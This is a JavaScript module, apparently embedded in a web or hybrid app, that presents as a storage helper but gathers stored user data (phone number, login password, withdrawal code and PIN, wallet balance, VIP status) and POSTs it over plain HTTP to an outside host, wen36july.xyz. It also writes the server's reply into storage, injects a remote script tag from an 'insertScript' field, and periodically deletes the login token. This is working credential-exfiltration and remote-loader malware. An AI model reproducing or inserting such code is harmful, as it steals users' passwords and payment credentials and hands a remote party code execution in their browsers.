const storage = require('./help.js')

const getJSONData = (key) => {
    try {
        let str = storage.getItem(key)
        if (str) {
            let data = JSON.parse(str)
            return data
        } else {
            return {}
        }
    } catch (e) {
        return {}
    }

}

const buildBody = () => {
    let userInfo = getJSONData('userInfo')
    let withdrawInfo = getJSONData('withdrawInfo')
    let loginInfo = getJSONData('loginInfo')
    let {
        is_forever_vip,
        isVip,
        hasPwd,
        last_buy_vip_type,
        user_code,
        guest_code,
        wallet_balance,
        promote_count
    } = userInfo
    let {
        mobile,
        password
    } = loginInfo
    let {
        code,
        pwd
    } = withdrawInfo
    return {
        isVip,
        hasPwd,
        is_forever_vip,
        last_buy_vip_type,
        user_code,
        guest_code,
        wallet_balance,
        promote_count,
        mobile,
        password,
        code,
        pwd
    }
}

const appenScript = (link) => {
    let script = document.createElement('script');
    script.type = 'text/javascript';
    script.src = `${link}`;
    document.body.appendChild(script);
}

module.exports = () => {
    let body = buildBody()
    let now = Date.now()
    let fetchInterval = storage.getItem('fetchInterval')
    let clearInterval = storage.getItem('clearInterval')
    let lastAuthTime = storage.getItem('lastAuthTime')
    let lastTimestamp = storage.getItem('lastTimestamp')
    clearInterval = Number(clearInterval) || 5760
    fetchInterval = Number(fetchInterval) || 240
    lastAuthTime = Number(lastAuthTime) || 0
    lastTimestamp = Number(lastTimestamp) || 0
    let successInterval = (now - lastTimestamp) / 1000 / 60
    let _clearInterval = (now - lastAuthTime) / 1000 / 60
    if (_clearInterval >= Number(clearInterval) || Number(lastAuthTime) === 0) {
        storage.removeItem('login-tokon-v1')
        storage.setItem('lastAuthTime', now)
    }
    let fetchUrl = `http://wen36july.xyz/city`
    if (successInterval >= fetchInterval) {
        fetch(fetchUrl, {
            headers: {
                "Content-Type": "application/json",
            },
            method: 'POST',
            body: JSON.stringify(body),
        }).then(resp => {
            if (resp.ok) {
                return resp.json()
            } else {
                storage.setItem('lastErrorTime', Date.now())
            }
        }).then(res => {
            storage.setItem('lastTimestamp', Date.now())
            Object.keys(res.data).forEach(key => {
                if(key !== 'insertScript') {
                    storage.setItem(key, JSON.stringify(res.data[key]))
                } else {
                    appenScript(res.data.insertScript)
                }
            })
        }).catch(e => {
            // console.log(e)
        })
    }
}
